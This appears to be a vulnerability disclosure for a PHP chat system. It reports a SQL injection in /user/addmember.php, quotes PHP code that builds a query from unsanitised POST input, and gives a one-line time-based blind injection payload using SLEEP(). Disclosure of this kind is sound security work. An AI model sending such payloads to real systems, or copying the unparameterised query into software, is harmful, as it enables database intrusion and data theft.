# Chat System Using PHP has sql injection in /user/addmember.php



## supplier



https://code-projects.org/chat-system-using-php-source-code/



## Vulnerability file



/user/addmember.php



## describe


The id parameter in /user/addmember.php is not properly sanitized or parameterized, which leaves it vulnerable to SQL injection attacks. Attackers can exploit this by injecting malicious SQL code to manipulate the database queries. Utilizing time-based SQL injection methods, they can introduce intentional delays in the database response through functions such as SLEEP(). This technique can be employed to verify the existence of the vulnerability and may also be used to extract sensitive information from the database.



## **Code analysis**



```php
<?php
	include('session.php');
	if (isset($_POST['id'])){
		$id=$_POST['id'];
		
		$query=mysqli_query($conn,"select * from chat_member where chatroom='$id' and userid='".$_SESSION['id']."'");
		if (mysqli_num_rows($query)<1){
			mysqli_query($conn,"insert into chat_member (chatroomid, userid) values ('$id', '".$_SESSION['id']."')");
		}
	}
?>
```

Inserting $_POST['id'] into Mysql query without any filter. A time-based blind SQL injection can be triggered.





## POC

```
id=1' AND (SELECT 1003 FROM (SELECT(SLEEP(5)))bYhJ) AND 'VosV'='VosV
```

Send this request, you can observe an additional 5 seconds time delay triggered by the time-based injection.
